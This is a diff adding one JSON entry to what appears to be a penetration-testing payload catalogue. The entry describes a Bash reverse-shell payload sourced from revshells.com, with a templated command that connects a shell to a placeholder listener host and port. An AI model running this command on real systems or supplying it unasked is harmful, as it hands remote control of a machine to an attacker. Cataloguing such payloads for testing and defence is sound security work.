@@ -1,0 +1,29 @@
+{
+  "id": "rsg-reverseshell-bash-i",
+  "name": "RSG · ReverseShell · Bash -i",
+  "command": "<shell> -i >& /dev/tcp/<lhost>/<lport> 0>&1",
+  "description": "Reverse Shell payload — Bash -i (via reverse-shell-generator).",
+  "platform": "linux",
+  "tags": [
+    "rsg",
+    "payload",
+    "reverse-shell",
+    "linux",
+    "mac"
+  ],
+  "source": "rsg",
+  "source_url": "https://www.revshells.com/",
+  "upstream_id": "ReverseShell/Bash -i/0",
+  "category": "payloads",
+  "subcategory": "reverse-shell",
+  "references": [
+    {
+      "title": "reverse-shell-generator (revshells.com)",
+      "url": "https://www.revshells.com/"
+    },
+    {
+      "title": "reverse-shell-generator GitHub",
+      "url": "https://github.com/0dayCTF/reverse-shell-generator"
+    }
+  ]
+}
